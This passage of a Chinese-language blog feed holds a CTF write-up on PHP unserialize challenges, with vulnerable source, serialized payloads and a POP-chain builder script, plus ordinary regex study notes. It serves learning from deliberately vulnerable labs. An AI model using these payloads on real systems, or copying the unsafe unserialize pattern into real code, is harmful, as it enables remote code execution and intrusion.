class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$a</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &lt; <span class=\"number\">32</span> || <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ åˆ°åº•è¡Œä¸•è¡Œå•Š&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只要发序列化后 $a=&quot;givemeflag&quot; 就行了<br>\n脚本太简单了直接放 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:5:&quot;funny&quot;:1:&#123;s:8:&quot;\\00funny\\00a&quot;;s:10:&quot;givemeflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6\"><a class=\"markdownIt-Anchor\" href=\"#6\">#</a> 6.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag6.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pyflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此题没有魔术方法无法进入类中调用类中方法，只能构造一个值为 pyflag 的字符串，里面还得有实例化 (空类字符串)<br>\n 看个例子:<br>\n![[Pasted image 20230427220851.png]]</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"> </span>&#123;</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&#x27;pyflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> funny;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$a</span>,<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"7\"><a class=\"markdownIt-Anchor\" href=\"#7\">#</a> 7.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag2.php&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$object</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">array_walk</span>(<span class=\"variable\">$this</span>, function (<span class=\"variable\">$fn</span>, <span class=\"variable\">$prev</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fn</span>[<span class=\"number\">0</span>] === <span class=\"string\">&quot;system&quot;</span> &amp;&amp; <span class=\"variable\">$prev</span> === <span class=\"string\">&quot;ls&quot;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Wow, you rce me! But I can&#x27;t let you do this. There is the flag. Enjoy it:)\\n&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        @<span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"title function_ invoke__\">add</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"keyword\">string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addMe</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Add Failed. Filename:&quot;</span> . <span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$args</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>([<span class=\"variable\">$this</span>, <span class=\"variable\">$func</span> . <span class=\"string\">&quot;Me&quot;</span>], <span class=\"variable\">$args</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">c</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">string</span> = <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$var</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$var</span>[<span class=\"variable\">$name</span>]();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;tryhackme&quot;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>目标:a 的 resolve, 接口 c::__get, 然后 a::__tostring, 然后 b 的 addMe,b 的__call,a 的 destruct<br>\npop:<br>\na::destruct-&gt;b::call-&gt;b::addMe-&gt;a::toString-&gt;c:get-&gt;a::get<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前面照抄</span><br><span class=\"line\">$a=new a();</span><br><span class=\"line\">$a-&gt;object=new b();</span><br><span class=\"line\">$a-&gt;object-&gt;filename=new a();</span><br><span class=\"line\">$a-&gt;object-&gt;filename-&gt;object=new c([&#x27;string&#x27;=&gt;[new A(),&quot;resolve&quot;]]);</span><br><span class=\"line\">发现一个报错,filename是protect属性第三步进行不了,于是我们可以修改其内部</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$object</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">array_walk</span>(<span class=\"variable\">$this</span>, function(<span class=\"variable\">$fn</span>, <span class=\"variable\">$prev</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (<span class=\"variable\">$fn</span>[<span class=\"number\">0</span>] === <span class=\"string\">&quot;system&quot;</span> &amp;&amp; <span class=\"variable\">$prev</span> === <span class=\"string\">&quot;ls&quot;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"title function_ invoke__\">add</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"keyword\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">#第三步,构造了construct,原因见上</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;b::construct&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"keyword\">new</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"keyword\">object</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">c</span>([<span class=\"string\">&#x27;string&#x27;</span>=&gt;[<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">a</span>(),<span class=\"string\">&#x27;resolve&#x27;</span>]]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//$this-&gt;filename-&gt;object=new c;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addMe</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Add Failed. Filename:&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$args</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>([<span class=\"variable\">$this</span>, <span class=\"variable\">$func</span>.<span class=\"string\">&quot;Me&quot;</span>], <span class=\"variable\">$args</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">c</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">string</span> = <span class=\"variable\">$string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#$name=&#x27;string&#x27;的值,var和name是相等的,传入一个数组是因为后面用的数组处理方式,new a()相等与键名,也就是$var,resolve就是键值,相当于$name</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$var</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$var</span>[<span class=\"variable\">$name</span>]();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span>=<span class=\"keyword\">new</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span>-&gt;<span class=\"keyword\">object</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">b</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$q</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$q</span>));</span><br></pre></td></tr></table></figure>\n<p>不加 url 编码的 payload 要再保护私有变量名加 %00,url 编码的则可以直接用</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "url": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "title": "正则表达式",
            "date_published": "2023-04-27T10:41:31.571Z",
            "content_html": "<h2>语法</h2>\n<p>runoo+b,可以匹配runoob,runooob,runoooooob等,+号代表前面的字符至少出现一次(一次或者多次)</p>\n<p>runoob*b,可以匹配runob,runoob,runooooob,*号代表*前面的字符可以不出现,也可以出现一次或者多次</p>\n<p>colou?r可以匹配color,colour,?代表前面的字符最多可以出现一次(<strong>0次或者一次</strong>)</p>\n<h2>普通字符</h2>\n<li>[ABC],会匹配[...]中的所有字符</li>\n<li>[^ABC],会匹配除了[...]中的所有字符</li>\n<li>[A-Z],表示一个区间会匹配所有大写字母</li>\n<li>/./匹配除换行符之外的任何单个字符</li>\n<li>[\\s\\S]匹配所有,\\s匹配所有空白符,包括换行,\\S非空白符,不包括换行</li>\n<li>\\w匹配字符数字下划线,等价于[A-Za-z0-9_]</li>\n<li>$匹配输入字符串的结尾位置</li>\n<li>{n},n是一个非负整数,匹配确定的n次,eg.o{2}不能匹配\"Bob\"中的o,但是能匹配\"food\"中的两个o</li>\n<li>{n,},至少匹配n次,o{2,}不能匹配\"Bob\"中的o,但能匹配\"fooood\"中的所有的o,o{1,}等价o+,o{0,}等价o*</li>\n<h3>定位符</h3>\n<li>^匹配输入字符串开始的地方</li>\n<li>$匹配输入字符串结尾的地方</li>\n<li>\\b匹配一个单词边界</li>\n<li>\\B匹配非单词边界</li>\n<li>\\d匹配一个数字字符</li>\n<li>\\D匹配一个非数字字符</li>\n<li>\\f匹配一个换页符</li>\n<h3>修饰符</h3>\n/pattern/i 不区分大小写\n/pattern/g 全局匹配,查找所有的匹配项\n/pattern/m 多行匹配,使边界字符^和$匹配每一行的开头和结尾\n/pattern/s 使特殊字符圆点.中包含换行符<code>\\n</code>\n<p>正则表达式的开始和结束除了 /…/ 还可以用 @…@</p>\n<h2>1.preg_match()</h2>\n执行一个正则表达式匹配\n<code>int preg_match(string $pattern,string $subject[, array &$matches [, int $flags = 0 [, int $offset = 0 ]]])</code>\n$pattern是要搜索的模式,字符串形式\n$subject是输入字符串\n$match:如果提供此参数,它将被填充为搜索结果,$matchs[0]将包含完整模式匹配的文本,$match[1]将包含第一个捕获子组匹配到的文本\n返回值将是0或者1,因为preg_match在匹配一次后将会自动停止搜索\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "url": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "title": "upload-labs靶场",
            "date_published": "2023-04-27T09:53:21.634Z",
